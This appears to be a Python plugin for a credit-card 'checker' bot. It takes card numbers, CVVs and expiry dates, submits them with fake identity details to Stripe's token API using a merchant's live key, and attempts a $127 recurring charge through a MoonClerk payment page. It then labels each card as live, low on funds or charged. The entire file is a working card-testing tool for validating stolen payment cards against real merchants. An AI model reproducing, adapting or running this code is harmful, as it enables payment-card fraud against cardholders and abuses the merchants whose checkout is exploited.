import asyncio
import json
import time
from mills.plugins._helpers.tools import find_between
import random



def between_callback(r, cc, cvv, mes, ano, rand_user):
    asyncio.run(new_func(r, cc, cvv, mes, ano, rand_user))




def new_func(r, cc, cvv, mes, ano, rand_user):
    st = int(time.time())
    a = r.get('https://www.corporatetraditions.com/products/google-play-5-gift-card')

    product_id = find_between(a.text, 'product","rid":','}')
    api_key = find_between(a.text, "apiKey: '", "'")

    if not product_id or not api_key:
        return f"<code>{cc}|{mes}|{ano}|{cvv}</code> - Unknown Error❌ - {abs(int(time.time()) - st)}s\n"

    payload_a = {
'card[name]': rand_user['name'],
'card[number]': cc,
'card[cvc]': cvv,
'card[exp_month]': mes,
'card[exp_year]': ano,
'card[address_zip]': rand_user['zip'],
'guid': 'NA',
'muid': 'NA',
'sid': 'NA',
'payment_user_agent': 'stripe.js/394a74bde; stripe-js-v3/394a74bde',
'time_on_page': '67311',
'key': 'pk_live_4VRhmzVJRIlREvyaOF05DbB9',
'_stripe_account': 'acct_16BsuvCD72pBQngW',
'pasted_fields': 'number',
}

    a = r.post('https://api.stripe.com/v1/tokens', data = payload_a)
    json_first = a.json()
    if 'error' in json_first:
        messa = json_first['error']['decline_code'].replace('_', ' ') if 'decline_code' in json_first['error'] else json_first['error']['code'].replace('_', ' ')
        return f"<code>{cc}|{mes}|{ano}|{cvv}</code> - {messa}❌ - {abs(int(time.time()) - st)}s\n"
        
    
    id = json_first['id']

    pay_b = {
    "checkout": {
        "amount_due_cents": 12700,
        "coupon_amount_cents": 0,
        "custom_id": None,
        "email": rand_user['email'],
        "embedded": True,
        "fee_applied_cents": 12700,
        "fee_cents": 0,
        "interval": "month",
        "interval_count": 1,
        "name": rand_user['name'],
        "payment_strategy": "card",
        "recurring": True,
        "starts_at": None,
        "subtotal_cents": 12700,
        "terms_accepted": True,
        "terms_of_service_id": None,
        "total_cents": 12700,
        "write_off_cents": 0,
        "extension_responses_attributes": [],
        "custom_field_responses_attributes": [
            {
                "custom_field_id": 209135,
                "kind": "text_field",
                "title": "Your Domain Name",
                "response": random.random_string(5) +  ".com"
            },
            {
                "custom_field_id": 226123,
                "kind": "text_field",
                "title": "Your Business or Organisation Name",
                "response": rand_user['name']
            },
            {
                "custom_field_id": 397277,
                "kind": "text_field",
                "title": "ABN or ACN Number"
            },
            {
                "custom_field_id": 226124,
                "kind": "text_field",
                "title": "Your Phone or Mobile Number",
                "response": rand_user['phone']
            },
            {
                "custom_field_id": 232224,
                "kind": "address",
                "title": "Postal Address or PO Box",
                "address_attributes": {
                    "line1": rand_user['street'],
                    "city": rand_user['city'],
                    "state": rand_user['state'],
                    "postal_code": rand_user['zip'],
                    "country_code": "US",
                    "verified": False
                }
            }
        ],
        "stripe_token": id
    },
    "v": 3
}


    b = r.post('https://app.moonclerk.com/pay/b844eafwca3', json = pay_b)
    json_last = b.json()
    if 'error' in json_last:
        if 'message' in json_last['error']:
            text = json_last['error']['message']
            if 'incorrect_zip' in text or 'Your card zip code is incorrect.' in text or 'The zip code you supplied failed validation' in text or 'card zip code is incorrect' in text:
                r_text, r_logo, r_respo = "ZIP INCORRECT", "✅", 'CVV MATCH'
            elif "card has insufficient funds" in text or 'insufficient_funds' in text or 'Insufficient Funds' in text:
                r_text, r_logo, r_respo = "LOW FUNDS", "✅", 'CVV MATCH'
            elif 'incorrect_cvc' in text or "card's security code is incorrect" in text or "card&#039;s security code is incorrect" in text or "security code is invalid" in text or 'CVC was incorrect' in text or "incorrect CVC" in text or 'cvc was incorrect' in text or 'Card Issuer Declined CVV' in text or 'security code is incorrect' in text:
                r_text, r_logo, r_respo = "CCN LIVE", "✅", 'CCN MATCH'
            elif 'Donation Confirmation' in text or "This page doesn't seem to exist" in text or 'seller_message": "Payment complete."' in text or '"cvc_check": "pass"' in text or 'thank_you' in text or '"type":"one-time"' in text or '"state": "succeeded"' in text or "Your payment has already been processed" in text or '"status": "succeeded"' in text or 'Thank' in text:
                r_text, r_logo, r_respo = "Charged $127", "✅", 'CVV MATCH'
            else:
                r_text, r_logo, r_respo = "DECLINED", "❌", 'DECLINED'
            return  f"<code>{cc}|{mes}|{ano}|{cvv}</code> - {r_text}{r_logo} - {abs(int(time.time()) - st)}s\n"
            # text += f"<code>{cc}|{mes}|{ano}|{cvv}</code> - {r_text}{r_logo}\n"
            # await kk.edit(text, link_preview = False)
        else:
            # return str(json.dumps(json_last['error'])), "❌", 'DECLINED'
            return f"<code>{cc}|{mes}|{ano}|{cvv}</code> - {str(json.dumps(json_last['error']))}❌ - {abs(int(time.time()) - st)}s\n"
            # text += f"<code>{cc}|{mes}|{ano}|{cvv}</code> - {str(json.dumps(json_last['error']))}❌\n"
            # await kk.edit(text, link_preview = False)
    elif b.status_code == 200:
        return f"<code>{cc}|{mes}|{ano}|{cvv}</code> - Charged$127✅ - {abs(int(time.time()) - st)}s\n"
        # text += f"<code>{cc}|{mes}|{ano}|{cvv}</code> - Charged $127✅\n"
        # await kk.edit(text, link_preview = False)
    else:
        return f"<code>{cc}|{mes}|{ano}|{cvv}</code> - {b.text}{r_logo} - {abs(int(time.time()) - st)}s\n"
        # text += f"<code>{cc}|{mes}|{ano}|{cvv}</code> - {b.text}\n"
        # await kk.edit(text, link_preview = False)
        
        

